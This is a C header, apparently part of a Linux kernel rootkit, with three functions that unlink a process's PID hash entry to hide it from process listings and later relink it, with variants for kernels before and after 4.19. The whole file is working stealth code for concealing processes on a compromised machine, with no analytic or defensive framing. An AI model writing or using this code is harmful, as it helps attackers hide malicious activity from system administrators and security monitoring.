#ifndef HIDE_PROCESS_H
#define HIDE_PROCESS_H
#include <linux/module.h>
#include <linux/tty.h>
#include <linux/mm.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/sched.h>

static void hide_process(struct task_struct *task, int *state)
{
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
		hlist_del_init(&task->pid_links[PIDTYPE_PID]);
	#else
		hlist_del_init(&task->pids[PIDTYPE_PID].node);
	#endif
    *state = 1;
}

static void hide_pid_process(struct task_struct *task)
{
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
		hlist_del_init(&task->pid_links[PIDTYPE_PID]);
	#else
		hlist_del_init(&task->pids[PIDTYPE_PID].node);
	#endif
}

static void recover_process(struct task_struct *task)
{
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 19, 0)
		hlist_add_head_rcu(&task->pid_links[PIDTYPE_PID], &task->thread_pid->tasks[PIDTYPE_PID]);
    #else
		hlist_add_head_rcu(&task->pids[PIDTYPE_PID].node, &task->pids[PIDTYPE_PID].pid->tasks[PIDTYPE_PID]);
    #endif
}

#endif /* HIDE_PROCESS_H */